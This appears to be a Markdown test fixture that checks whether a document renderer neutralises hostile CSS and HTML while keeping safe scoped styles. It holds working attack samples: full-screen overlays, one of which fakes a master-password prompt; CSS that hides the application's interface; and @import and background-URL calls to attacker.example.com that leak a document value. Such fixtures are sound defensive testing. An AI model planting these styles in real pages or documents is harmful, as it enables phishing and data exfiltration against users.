# Adversarial Security Fixture: CSS Escape & Overlay Hijacking

This fixture tests CSS styling attacks, fixed viewport overlays, chrome hijacking, and external stylesheet leaks per PRD Section 7.4 and Section 8.1.

## 1. Full-Screen Fixed Viewport Overlay

<style>
  .hijack-screen-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 999999;
    background-color: rgba(255, 0, 0, 0.95);
    pointer-events: all;
  }
</style>

<div class="hijack-screen-overlay">
  <h2>Phishing / Overlay Hijack Attempt</h2>
  <p>Please enter your master password to continue.</p>
</div>

## 2. Targeting Application Chrome via CSS Selectors

<style>
  /* Attempt to hide application UI components */
  .tab-bar,
  .app-shell,
  .document-header-bar,
  .tab-close-btn,
  .empty-state {
    display: none !important;
    visibility: hidden !important;
  }

  /* Attempt to restyle window root */
  body,
  html,
  :root,
  #app,
  #root {
    background-color: rgb(0, 0, 0) !important;
    color: rgb(255, 0, 0) !important;
  }
</style>

## 3. Remote Stylesheet Inclusion via @import

<style>
  @import url("https://attacker.example.com/malicious.css");
  @import "http://attacker.example.com/exfiltrate.css";
</style>

## 4. Background URL Data Exfiltration

<style>
  .data-leak {
    background-image: url("https://attacker.example.com/leak?doc=secret");
    list-style-image: url("http://attacker.example.com/token.png");
  }
</style>

<div class="data-leak">
  <p>Attempting to leak data or trigger background network traffic.</p>
</div>

## 5. Inline Fixed Positioning

<div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647; background: yellow;">
  <p>Inline style position: fixed overlay attack</p>
</div>

## 6. Safe Scoped Styles (Must be preserved)

<style>
  .safe-callout {
    border-left: 4px solid #3b82f6;
    padding: 12px;
    background-color: #f0f9ff;
    color: #1e3a8a;
  }
</style>

<div class="safe-callout">
  <p>This styled container is safe, scoped to the document, and must render properly.</p>
</div>
